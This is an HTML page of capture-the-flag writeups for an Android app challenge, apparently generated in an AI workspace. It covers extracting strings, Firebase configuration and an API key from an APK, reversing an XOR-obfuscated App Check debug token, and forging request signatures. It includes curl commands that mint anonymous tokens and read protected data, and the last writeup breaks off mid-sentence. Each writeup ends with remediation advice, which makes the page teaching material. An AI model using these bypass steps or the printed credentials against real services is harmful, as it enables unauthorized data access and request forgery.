<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
<title>FAM CTF — Writeups</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,500&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root{
    --cream:#f4f0e6;--cream-2:#ece6d6;--ink:#1c1a15;--ink-soft:#55503f;--rule:#ddd5bd;
    --terracotta:#c1501f;--terracotta-soft:#e9c9b4;--card:#fbf9f2;--code-bg:#17150f;
    --code-text:#f2ead9;--green:#4d7a4a;color-scheme:light;
  }
  *{box-sizing:border-box;}
  html,body{margin:0;padding:0;height:100%;}
  body{background:var(--cream);color:var(--ink);font-family:'Inter',sans-serif;font-size:15px;line-height:1.6;
    padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);}
  a{color:inherit;text-decoration:none;}
  code{font-family:'JetBrains Mono',monospace;}
  .app{display:flex;min-height:100vh;}
  .sidebar{width:252px;flex-shrink:0;background:var(--cream-2);border-right:1px solid var(--rule);
    padding:22px 16px 40px;position:sticky;top:0;height:100vh;overflow-y:auto;}
  .brand{display:flex;align-items:center;gap:10px;padding:2px 6px 20px;border-bottom:1px solid var(--rule);margin-bottom:10px;}
  .brand .logo{width:34px;height:34px;border-radius:8px;background:var(--terracotta);color:#fff;
    display:flex;align-items:center;justify-content:center;font-weight:700;font-family:'Playfair Display',serif;font-size:16px;}
  .brand .logo-img{width:34px;height:34px;border-radius:8px;object-fit:cover;border:1px solid var(--rule);flex-shrink:0;}
  .brand span{font-family:'Playfair Display',serif;font-weight:700;font-size:19px;letter-spacing:0.2px;}
  .nav-section{margin-bottom:4px;}
  .nav-item{display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:6px;
    font-size:13.5px;font-weight:500;color:var(--ink-soft);cursor:pointer;}
  .nav-item:hover{background:rgba(0,0,0,0.04);color:var(--ink);}
  .nav-item.active{background:var(--ink);color:var(--cream);}
  .nav-item .ic{width:17px;text-align:center;font-size:13px;flex-shrink:0;}
  .nav-label{margin-top:18px;margin-bottom:6px;padding:0 10px;font-size:10.5px;font-weight:700;
    letter-spacing:0.08em;color:#8a8368;text-transform:uppercase;}
  .main{flex:1;display:flex;flex-direction:column;min-width:0;}
  .topbar{display:flex;align-items:center;gap:20px;padding:16px 32px;border-bottom:1px solid var(--rule);
    position:sticky;top:0;background:var(--cream);z-index:5;}
  .search{flex:1;max-width:520px;margin:0 auto;display:flex;align-items:center;gap:10px;
    background:var(--card);border:1px solid var(--rule);border-radius:8px;padding:9px 14px;color:#9a927a;font-size:13.5px;}
  .top-right{display:flex;align-items:center;gap:10px;color:var(--ink-soft);font-size:12.5px;}
  .pill{font-family:'JetBrains Mono',monospace;font-size:11px;background:var(--card);border:1px solid var(--rule);
    border-radius:20px;padding:4px 10px;}
  .content{flex:1;display:flex;}
  .col-main{flex:1;padding:34px 40px 80px;max-width:900px;min-width:0;}
  .col-toc{width:250px;flex-shrink:0;padding:34px 24px 40px;border-left:1px solid var(--rule);}
  h1.page-title{font-family:'Playfair Display',serif;font-weight:700;font-size:34px;
    display:flex;align-items:center;gap:14px;margin:0 0 16px;}
  .divider{border:none;border-top:1px solid var(--rule);margin:18px 0 26px;}
  .lede{font-size:17px;font-style:italic;color:var(--ink-soft);max-width:640px;margin:0 0 20px;font-family:'Playfair Display',serif;}
  p{color:var(--ink-soft);}
  .note{font-style:italic;color:#8a8368;font-size:13.5px;}
  .stat-row{display:flex;gap:18px;margin:26px 0 38px;flex-wrap:wrap;}
  .card{background:var(--card);border:1px solid var(--rule);border-radius:10px;padding:18px 20px;flex:1;min-width:150px;}
  .card .num{font-family:'Playfair Display',serif;font-weight:700;font-size:26px;color:var(--terracotta);}
  .card .lbl{font-size:11px;letter-spacing:0.06em;text-transform:uppercase;color:#8a8368;font-weight:700;margin-top:4px;}
  h2.section-title{font-family:'Playfair Display',serif;font-weight:700;font-size:22px;margin:34px 0 14px;}
  table{width:100%;border-collapse:collapse;font-size:13.5px;margin:14px 0 22px;}
  thead th{text-align:left;font-size:10.5px;letter-spacing:0.06em;text-transform:uppercase;color:#8a8368;
    font-weight:700;padding:0 12px 10px;border-bottom:1px solid var(--rule);}
  tbody td{padding:13px 12px;border-bottom:1px solid var(--rule);color:var(--ink-soft);}
  tbody tr:hover{background:rgba(193,80,31,0.04);cursor:pointer;}
  .ev-name{color:var(--ink);font-weight:600;display:flex;align-items:center;gap:8px;}
  .flagcell{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--terracotta);}
  .breadcrumb-note{color:var(--ink-soft);font-size:14.5px;margin-bottom:6px;}
  .cat-label{font-size:11px;letter-spacing:0.08em;text-transform:uppercase;color:#8a8368;font-weight:700;margin:26px 0 6px;}
  h3.writeup-title{font-family:'Playfair Display',serif;font-weight:700;font-size:26px;margin:0 0 14px;}
  .meta-row{display:flex;gap:22px;flex-wrap:wrap;padding-bottom:16px;margin-bottom:18px;border-bottom:1px solid var(--rule);
    font-size:12.5px;color:#8a8368;}
  .meta-row b{color:var(--ink);font-weight:600;}
  .back-link{display:inline-block;margin-bottom:14px;font-size:12.5px;color:var(--terracotta);font-weight:600;cursor:pointer;}
  .col-main h2{font-family:'Playfair Display',serif;font-weight:700;font-size:21px;margin:30px 0 10px;}
  .col-main h3{font-weight:700;font-size:16px;margin:22px 0 8px;color:var(--ink);}
  .col-main ul,.col-main ol{color:var(--ink-soft);padding-left:22px;}
  .col-main li{margin:4px 0;}
  .col-main code{background:var(--code-bg);color:var(--code-text);font-size:12.5px;padding:2px 7px;border-radius:4px;}
  .desc-box{background:var(--card);border:1px solid var(--rule);border-left:3px solid var(--terracotta);
    border-radius:8px;padding:16px 20px;margin:14px 0 22px;color:var(--ink-soft);}
  .desc-box p{margin:0;color:var(--ink-soft);}
  .code-block{position:relative;background:var(--code-bg);color:var(--code-text);
    font-family:'JetBrains Mono',monospace;font-size:12.5px;border-radius:8px;padding:18px 18px 16px;margin:10px 0 20px;
    overflow-x:auto;}
  .code-block pre{margin:0;white-space:pre;}
  .code-block code{background:none;color:inherit;padding:0;}
  .copy-btn{position:absolute;top:10px;right:12px;font-size:10.5px;font-weight:700;
    background:#2a2719;color:#cfc7ad;border:none;border-radius:5px;padding:5px 10px;letter-spacing:0.05em;cursor:pointer;}
  .copy-btn:hover{background:#3a3624;}
  .flag-box{display:flex;align-items:center;gap:0;border-radius:8px;overflow:hidden;border:1px solid var(--rule);margin-top:20px;}
  .flag-box .tag{background:var(--terracotta);color:#fff;font-weight:700;font-size:11.5px;padding:12px 16px;letter-spacing:0.05em;flex-shrink:0;}
  .flag-box .val{flex:1;background:var(--code-bg);color:#f0c9a8;font-family:'JetBrains Mono',monospace;font-size:13px;
    padding:12px 16px;word-break:break-all;}
  .flag-box .copy-btn{position:static;background:var(--cream-2);color:var(--ink-soft);flex-shrink:0;margin-right:10px;}
  .toc-head{font-size:10.5px;letter-spacing:0.08em;text-transform:uppercase;color:var(--terracotta);
    font-weight:700;display:flex;align-items:center;gap:8px;margin-bottom:14px;}
  .toc-head::before{content:"";width:3px;height:14px;background:var(--terracotta);display:inline-block;border-radius:2px;}
  .toc-link{display:block;padding:5px 10px;margin-left:-10px;border-radius:5px;font-size:12.5px;color:var(--ink-soft);
    border-left:2px solid transparent;cursor:pointer;}
  .toc-link:hover{color:var(--ink);}
  .toc-link.active{color:var(--terracotta);border-left:2px solid var(--terracotta);background:rgba(193,80,31,0.06);font-weight:600;}
  ::-webkit-scrollbar{width:9px;height:9px;}
  ::-webkit-scrollbar-thumb{background:#c9c1a6;border-radius:6px;}
  ::-webkit-scrollbar-track{background:transparent;}
  @media (max-width:980px){.col-toc{display:none;}.sidebar{width:190px;}.col-main{padding:26px 20px 60px;}}
</style>
</head>

const challenges = [{"num": "01", "id": "the-library", "title": "THE LIBRARY", "category": "Static Analysis", "icon": "\ud83d\udcda", "path": "/home/claude/fampay/Fampay/Static_Analysis/THE_LIBRARY/README.md", "target": "fam-ctf.apk", "flag": "FAM{strings_d0nt_l13_1n_n4t1v3_l4nd}", "body_html": "<p><strong>Category:</strong> Reverse Engineering</p>\n<h2>Description</h2>\n<blockquote class=\"desc-box\">\n<p>Many times devs put secrets in code and forget to remove. Can you find that secret?</p>\n</blockquote>\n<h2>Solution</h2>\n<p>Extract the APK strings and search for the flag.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">strings fam-ctf.apk | grep &quot;FAM{&quot;\n</code></pre></div>\n<p>The flag was directly embedded as a plain string inside the APK.</p>\n<h2>Flag</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">FAM{strings_d0nt_l13_1n_n4t1v3_l4nd}\n</code></pre></div>\n<h2>Tools Used</h2>\n<ul>\n<li>strings</li>\n<li>grep</li>\n</ul>"}, {"num": "02", "id": "the-database", "title": "THE DATABASE", "category": "Firebase", "icon": "\ud83d\udd25", "path": "/home/claude/fampay/Fampay/Firebase/THE_DATABASE/README.md", "target": "fam-ctf.apk", "flag": "FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}", "body_html": "<p><strong>Category:</strong> Mobile / Firebase misconfiguration\n<strong>Target:</strong> <code>fam-ctf.apk</code></p>\n<h2>Challenge prompt</h2>\n<blockquote class=\"desc-box\">\n<p>The door is open to anyone. You don't need a name to enter, but the room still has a lock.\n<code>hint: identity is optional here</code></p>\n</blockquote>\n<h2>1. Recon \u2014 pulling Firebase config out of the APK</h2>\n<p>The APK was unzipped directly (no need for a full decompile at this stage):</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">unzip -o fam-ctf.apk -d extracted\n</code></pre></div>\n<p><code>resources.arsc</code> holds the compiled <code>strings.xml</code> values injected by the Firebase Gradle plugin. Grepping it directly for known Firebase resource names surfaced the project's live configuration:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">strings extracted/resources.arsc | grep -iE &quot;firebaseio|firebasedatabase|project_id|database_url|app_id|api_key&quot;\n</code></pre></div>\n<p>Recovered values:</p>\n<table>\n<thead>\n<tr>\n<th>Key</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>API key</td>\n<td><code>AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww</code></td>\n</tr>\n<tr>\n<td>App ID</td>\n<td><code>1:674578159678:android:775058d15777caf841996f</code></td>\n</tr>\n<tr>\n<td>Project ID</td>\n<td><code>fam-ctf</code></td>\n</tr>\n<tr>\n<td>Realtime Database URL</td>\n<td><code>https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app</code></td>\n</tr>\n</tbody>\n</table>\n<p>An API key like this isn't a secret in the traditional sense \u2014 it just identifies the Firebase project to Google's backend. The real question is what the <em>security rules</em> on the database actually enforce.</p>\n<h2>2. Confirming the code path</h2>\n<p>To make sure Flag 2 didn't depend on anything extra (custom claims, a specific UID, a signed token, etc.), the DEX was decompiled with <strong>androguard</strong>:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">from androguard.misc import AnalyzeAPK\na, d, dx = AnalyzeAPK(&quot;fam-ctf.apk&quot;)\n</code></pre></div>\n<p><code>MainActivity</code> showed the relevant logic in full:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">private final void signInAnonymouslyAndVerifyFlag2() {\n    FirebaseAuth.getInstance()\n        .signInAnonymously()\n        .addOnSuccessListener(...)   // -&gt; calls verifyFlag2()\n        .addOnFailureListener(...);\n}\n\nprivate final void verifyFlag2() {\n    FirebaseDatabase\n        .getInstance(&quot;https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app&quot;)\n        .getReference(&quot;flag&quot;)\n        .addListenerForSingleValueEvent(...);\n}\n</code></pre></div>\n<p>No signature, no App Check, no username. Just:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>signInAnonymously()  \u2192  read /flag\n</code></pre></div>\n<p>This confirmed the hint literally: <strong>identity is optional</strong> \u2014 any anonymous user, not a specific one, is enough to satisfy the rule. The likely Realtime Database rule is something like:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-json\">{\n  &quot;rules&quot;: {\n    &quot;flag&quot;: {\n      &quot;.read&quot;: &quot;auth != null&quot;\n    }\n  }\n}\n</code></pre></div>\n<p>which allows <em>any</em> authenticated principal \u2014 including a throwaway anonymous session created on demand \u2014 to read the node.</p>\n<h2>3. Reproducing it without running the app</h2>\n<p>Since the whole flow is just two HTTP calls, there's no need to install the APK, use an emulator, or capture traffic with Burp. It can be done directly from a terminal.</p>\n<p><strong>Step 1 \u2014 get an anonymous ID token from the Identity Toolkit REST API:</strong></p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">curl -s -X POST \\\n  &quot;https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww&quot; \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;returnSecureToken&quot;:true}'\n</code></pre></div>\n<p>This mints a brand-new anonymous Firebase user and returns an <code>idToken</code> (a signed JWT with <code>\"sign_in_provider\": \"anonymous\"</code>), along with a <code>localId</code> (UID) and <code>refreshToken</code>.</p>\n<p><strong>Step 2 \u2014 use that token as the RTDB <code>auth</code> query param:</strong></p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">IDTOKEN=&quot;&lt;idToken from step 1&gt;&quot;\n\ncurl -s &quot;https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json?auth=$IDTOKEN&quot;\n</code></pre></div>\n<p>The Realtime Database REST API accepts a Firebase Auth ID token via <code>?auth=</code>, evaluates it exactly the way the SDK would, and applies the security rules accordingly.</p>\n<h2>4. Result</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-json\">&quot;FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}&quot;\n</code></pre></div>\n<h2>Root cause</h2>\n<p>The database rule trusted <em>authentication</em>, not <em>authorization</em>. Anonymous auth satisfies <code>auth != null</code> just as well as a real signed-in user, so gating a sensitive read on \"is someone logged in\" rather than \"is this the <em>right</em> someone\" (e.g. a custom claim, a specific UID, or an App Check token) makes the resource effectively public \u2014 anyone can self-issue a valid credential for free, with no identity verification at all.</p>\n<h2>Takeaways / remediation</h2>\n<ul>\n<li>Never use <code>auth != null</code> alone to protect sensitive data if anonymous auth is enabled on the project \u2014 it's equivalent to no rule at all.</li>\n<li>Gate sensitive reads on <code>auth.token.firebase.sign_in_provider != 'anonymous'</code>, a custom claim, or a specific UID.</li>\n<li>Enforce <strong>App Check</strong> on the Realtime Database (not just Firestore) if the intent is to restrict access to the legitimate app.</li>\n<li>API keys and database URLs baked into an APK are not secrets \u2014 never rely on their obscurity as a security boundary.</li>\n</ul>"}, {"num": "03", "id": "the-vault", "title": "THE VAULT", "category": "Firebase", "icon": "\ud83d\udd25", "path": "/home/claude/fampay/Fampay/Firebase/THE_VAULT/README.md", "target": "fam-ctf.apk \u2192 libfam.so", "flag": "FAM{4pp_ch3ck_byp4ss_g00d_j0b}", "body_html": "<p><strong>Category:</strong> Mobile / Native reversing + Firebase App Check bypass\n<strong>Target:</strong> <code>fam-ctf.apk</code> \u2192 <code>lib/x86_64/libfam.so</code></p>\n<h2>Challenge prompt</h2>\n<blockquote class=\"desc-box\">\n<p>The vault trusts no one it hasn't met. But the app already made introductions. Something in the code proves who you are.\n<code>hint: the token is hiding in plain sight</code></p>\n</blockquote>\n<h2>1. Identifying the target</h2>\n<p>Static analysis of <code>MainActivity</code> (see Flag 2 writeup) showed <code>verifyFlag3()</code> reads from <strong>Firestore</strong> instead of Realtime Database:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">FirebaseFirestore.getInstance()\n    .collection(&quot;flags&quot;)\n    .document(&quot;flag3&quot;)\n    .get()\n</code></pre></div>\n<p>Unlike Flag 2, a plain anonymous ID token wasn't enough here \u2014 this collection is protected by <strong>Firebase App Check</strong>, which the app installs before any Firebase calls:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">FirebaseAppCheck.getInstance()\n    .installAppCheckProviderFactory(DebugTokenAppCheckProviderFactory.getInstance());\n</code></pre></div>\n<p>App Check requires every request to carry a signed attestation JWT proving it came from a legitimate, registered instance of the app \u2014 on top of the user's normal auth token. The debug provider is Google's escape hatch for this during development: it generates (or in this case, hardcodes) a UUID <strong>debug token</strong>, which must be registered in the Firebase console, and which the console will then treat as equivalent to a real device attestation.</p>\n<p>The hint \u2014 <em>\"the app already made introductions\u2026 the token is hiding in plain sight\"</em> \u2014 pointed straight at that debug token being embedded somewhere in the compiled app.</p>\n<h2>2. Locating the JNI export</h2>\n<p>Checking exported symbols in the native library:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">nm -D --defined-only lib/x86_64/libfam.so | grep Java\n</code></pre></div>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>Java_com_ctf_fam_MainActivity_computeSignature\nJava_com_ctf_fam_MainActivity_getDebugToken   &lt;-- this one\nJava_com_ctf_fam_MainActivity_getSecretFromNative\nJava_com_ctf_fam_MainActivity_getUsernames\n</code></pre></div>\n<p><code>getDebugToken</code> was the obvious target.</p>\n<h2>3. Reversing the algorithm</h2>\n<p>Disassembling with <code>objdump -d --start-address=0x6c30 --stop-address=0x6d70</code>, the loop logic reduces to:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-c\">for (i = 0; i &lt; 0x24; i++) {           // 36 iterations\n    idx  = i % 19;                      // computed via multiply-shift, not a real div instruction\n    byte = table1[idx] ^ 0xAA;\n    byte = table2[i] ^ byte;\n    result.push_back((char)byte);\n}\n</code></pre></div>\n<p>So the token is a two-table XOR:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>token[i] = (table1[i % 19] ^ 0xAA) ^ table2[i]\n</code></pre></div>\n<p>Where <code>table1</code> is a 19-byte array at <code>DAT_34f0</code> and <code>table2</code> is a 36-byte array at <code>DAT_3510</code> \u2014 both referenced via RIP-relative <code>lea</code> in <code>.rodata</code>.</p>\n<p>An earlier attempt to read these tables directly out of Ghidra's disassembly view was unreliable: Ghidra was still auto-disassembling the data bytes as x86 instructions (<code>JLE</code>, <code>JP</code>, etc.) rather than showing them as raw bytes, corrupting the copy-paste.</p>\n<h2>4. Extracting the tables directly from the ELF (no Ghidra needed)</h2>\n<p>Since <code>.rodata</code> starts at file offset <code>0x2ac0</code> == virtual address <code>0x2ac0</code> (no load-bias headache for this section), the bytes could be read straight from the file:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">with open(&quot;lib/x86_64/libfam.so&quot;, &quot;rb&quot;) as f:\n    data = f.read()\n\nt1 = data[0x34f0:0x34f0+19]   # table1\nt2 = data[0x3510:0x3510+36]   # table2\n\ntoken = &quot;&quot;.join(chr((t1[i % 19] ^ 0xAA) ^ t2[i]) for i in range(36))\nprint(token)\n</code></pre></div>\n<p>Output:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>8F76557D-A35A-4B51-94D4-D0DF98D79B55\n</code></pre></div>\n<p>A clean UUID \u2014 exactly the shape Firebase App Check debug tokens take.</p>\n<h2>5. Exchanging the debug token for an App Check attestation</h2>\n<p>The debug token itself isn't valid on the wire \u2014 it has to be exchanged for a signed App Check JWT via the App Check REST API:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">curl -s -X POST \\\n  &quot;https://firebaseappcheck.googleapis.com/v1/projects/674578159678/apps/1:674578159678:android:775058d15777caf841996f:exchangeDebugToken?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww&quot; \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;debug_token&quot;:&quot;8F76557D-A35A-4B51-94D4-D0DF98D79B55&quot;}'\n</code></pre></div>\n<p>This returned a valid App Check JWT (<code>\"provider\":\"debug\"</code> in its payload), confirming the debug token had genuinely been registered against this Firebase project \u2014 the challenge author left it trusted server-side.</p>\n<h2>6. Reading the flag</h2>\n<p>With both credentials in hand \u2014 an anonymous Firebase Auth ID token (from Flag 2's flow) and the freshly-minted App Check token \u2014 the Firestore REST API accepted the read:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">IDTOKEN=&quot;&lt;anonymous ID token&gt;&quot;\nAPPCHECK_TOKEN=&quot;&lt;App Check JWT from the exchange call&gt;&quot;\n\ncurl -s &quot;https://firestore.googleapis.com/v1/projects/fam-ctf/databases/(default)/documents/flags/flag3&quot; \\\n  -H &quot;Authorization: Bearer $IDTOKEN&quot; \\\n  -H &quot;X-Firebase-AppCheck: $APPCHECK_TOKEN&quot;\n</code></pre></div>\n<p>Response:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-json\">{\n  &quot;name&quot;: &quot;projects/fam-ctf/databases/(default)/documents/flags/flag3&quot;,\n  &quot;fields&quot;: {\n    &quot;value&quot;: { &quot;stringValue&quot;: &quot;FAM{4pp_ch3ck_byp4ss_g00d_j0b}&quot; }\n  },\n  &quot;createTime&quot;: &quot;2026-06-30T11:44:40.779095Z&quot;,\n  &quot;updateTime&quot;: &quot;2026-06-30T11:44:40.779095Z&quot;\n}\n</code></pre></div>\n<h2>Root cause</h2>\n<p>App Check's <strong>debug provider</strong> is meant strictly for local development \u2014 it lets a developer register one fixed token in the Firebase console so debug builds can bypass real device attestation. The vulnerability here wasn't in App Check itself, but in how the debug token was handled by the shipped app:</p>\n<ul>\n<li>It was compiled into a <strong>production/distributable APK</strong>, not gated behind a debug build flavor.</li>\n<li>It wasn't a random per-install token \u2014 it was <strong>deterministically derivable</strong> from a two-table XOR obfuscation, i.e. \"encrypted\" with a scheme that's trivially reversible once the binary is in an attacker's hands.</li>\n<li>Once the debug token is known, App Check adds <em>zero</em> additional assurance \u2014 anyone can exchange it for a valid attestation JWT and impersonate a legitimate app instance indefinitely (or until the token is unregistered).</li>\n</ul>\n<p>App Check successfully stopped raw, unauthenticated REST access (which is exactly what it's designed to do), but the debug-token escape hatch left in the shipping binary fully undermined that guarantee.</p>\n<h2>Takeaways / remediation</h2>\n<ul>\n<li>Never ship the App Check <strong>debug provider</strong> in a release/production build \u2014 use <code>PlayIntegrityAppCheckProviderFactory</code> (or the equivalent App Attest / reCAPTCHA provider) for real builds, and gate the debug provider behind <code>BuildConfig.DEBUG</code> or a separate build flavor entirely.</li>\n<li>Treat any embedded \"secret\" derivation logic (XOR tables, custom encodings, etc.) as reversible \u2014 obfuscation is not a security boundary once an attacker has the binary.</li>\n<li>Rotate/unregister debug tokens in the Firebase console regularly, and audit which tokens are currently trusted for a project.</li>\n<li>Prefer extracting embedded constants directly from the compiled binary (<code>objdump</code>/raw file offsets) over relying on a disassembler's interpreted view, especially when data is being misidentified as code.</li>\n</ul>"}, {"num": "04", "id": "the-endpoint", "title": "THE ENDPOINT", "category": "Dynamic Analysis", "icon": "\ud83d\udce1", "path": "/home/claude/fampay/Fampay/Dynamic_Analysis/THE_ENDPOINT/README.md", "target": "fam-ctf.apk \u2192 libfam.so", "flag": "FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}", "body_html": "<p><strong>Category:</strong> Mobile / Native reversing + custom request-signing bypass\n<strong>Target:</strong> <code>fam-ctf.apk</code> \u2192 <code>lib/x86_64/libfam.so</code>\n<strong>Endpoint:</strong> <code>https://ctf.fampay.co/api/check</code></p>\n<h2>Challenge prompt</h2>\n<blockquote class=\"desc-box\">\n<p>The server only trusts what it can verify. Intercept. Modify. But can you keep it honest?\n<code>hint: only admin has clearance</code></p>\n</blockquote>\n<h2>1. Finding the call site</h2>\n<p>Static analysis of <code>MainActivity</code> (via androguard) showed <code>submitChallenge()</code> builds a signed request:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">String body = &quot;{\\&quot;username\\&quot;:\\&quot;&quot; + selectedUsername + &quot;\\&quot;}&quot;;\nString sig  = computeSignature(&quot;POST&quot;, &quot;/api/check&quot;, body);\n</code></pre></div>\n<p>and the worker thread (<code>submitChallenge$1</code>) sends it as:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">HttpURLConnection conn = (HttpURLConnection) new URL(baseUrl + &quot;/api/check&quot;).openConnection();\nconn.setRequestMethod(&quot;POST&quot;);\nconn.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);\nconn.setRequestProperty(&quot;X-Signature&quot;, sig);\n// body written to output stream\n</code></pre></div>\n<p>So the server trusts a request if and only if the <code>X-Signature</code> header matches a signature computed over <code>method | path | body</code> \u2014 a classic HMAC-style request-signing scheme. The hint (<em>\"only admin has clearance\"</em>) told us exactly what body content mattered: <code>{\"username\":\"admin\"}</code>. The only obstacle was producing a signature the server would accept for that exact body, without any legitimate credentials.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">public final native String computeSignature(String p0, String p1, String p2);\n</code></pre></div>\n<p>\u2014 implemented entirely in the native library, so the actual signing logic had to be reversed out of <code>libfam.so</code>.</p>\n<h2>2. Reversing <code>computeSignature()</code></h2>\n<p>Exported symbol:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>Java_com_ctf_fam_MainActivity_computeSignature\n</code></pre></div>\n<p>The JNI wrapper pulls the three Java strings and concatenates them with a <code>\"|\"</code> separator (read directly from <code>.rodata</code> at <code>0x32d9</code>):</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>message = method + &quot;|&quot; + path + &quot;|&quot; + body\n</code></pre></div>\n<p>e.g. for our forged request: <code>\"POST|/api/check|{\\\"username\\\":\\\"admin\\\"}\"</code>.</p>\n<p>That message is then passed into a helper function which does the actual signing. Disassembling it revealed a custom, keyed hash built from three well-known primitives glued together:</p>\n<ul>\n<li><strong>A per-byte keystream</strong> pulled from the <em>same</em> 19-byte table (<code>table1</code> @ <code>0x34f0</code>) used earlier to derive the App Check debug token in Flag 3 \u2014 the challenge author reused one obfuscation table across multiple challenges.</li>\n<li><strong>MurmurHash3's 64-bit finalizer (<code>fmix64</code>)</strong> as the core mixing/diffusion step (identified from its constants <code>0xff51afd7ed558ccd</code> / <code>0xc4ceb9fe1a85ec53</code>, both textbook Murmur3 magic numbers).</li>\n<li><strong>A 4-word (32-byte) internal state</strong>, seeded from hardcoded constants in <code>.rodata</code> at <code>0x3570</code>.</li>\n<li>A decoy FNV-1a accumulator computed in parallel but never used in the final output \u2014 almost certainly dead code included to slow down reversing.</li>\n</ul>\n<p>Reconstructed algorithm:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">state = [0x6c62272e07bb0142, 0x62b821756295c58d,\n         0x34a45d6b4dc3ffd4, 0x1c97e9b06437a27a]\n\nfor i, byte in enumerate(message):\n    keystream = table1[i % 19] ^ 0xAA\n    c = byte ^ keystream\n\n    a, b, cc, d = i % 4, (i+1) % 4, (i+2) % 4, (i+3) % 4\n    state[a]  ^= c\n    state[b]  += state[a]\n    state[cc]  = fmix64(state[cc])\n    state[d]   = (state[b] * 0x517cc1b727220a95) ^ state[d]\n\nfor _ in range(4):\n    for b in range(4):\n        state[b] = fmix64(state[b] ^ state[(b+1) % 4])\n\nsignature = &quot;%016x%016x%016x%016x&quot; % tuple(state)   # 64 lowercase hex chars\n</code></pre></div>\n<p>Where <code>fmix64</code> is the standard MurmurHash3 finalizer:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">def fmix64(k):\n    k ^= k &gt;&gt; 33\n    k = (k * 0xff51afd7ed558ccd) &amp; MASK64\n    k ^= k &gt;&gt; 33\n    k = (k * 0xc4ceb9fe1a85ec53) &amp; MASK64\n    k ^= k &gt;&gt; 33\n    return k\n</code></pre></div>\n<p>The output format string, also read straight from <code>.rodata</code> (<code>0x320d</code>), confirmed the exact serialization: <code>\"%016llx%016llx%016llx%016llx\"</code>.</p>\n<h2>3. Forging a signature for <code>admin</code></h2>\n<p>With the full algorithm and key table extracted directly from the binary (no emulator, no Frida hooking needed \u2014 everything required was static data in <code>.rodata</code>), the signature could be computed for an arbitrary body entirely offline:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">body = '{&quot;username&quot;:&quot;admin&quot;}'\nsig  = compute_signature(&quot;POST&quot;, &quot;/api/check&quot;, body)\n</code></pre></div>\n<h2>4. Hitting the real endpoint</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">curl -s -X POST &quot;https://ctf.fampay.co/api/check&quot; \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -H &quot;X-Signature: 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188&quot; \\\n  -d '{&quot;username&quot;:&quot;admin&quot;}'\n</code></pre></div>\n<p>The server accepted the forged signature and 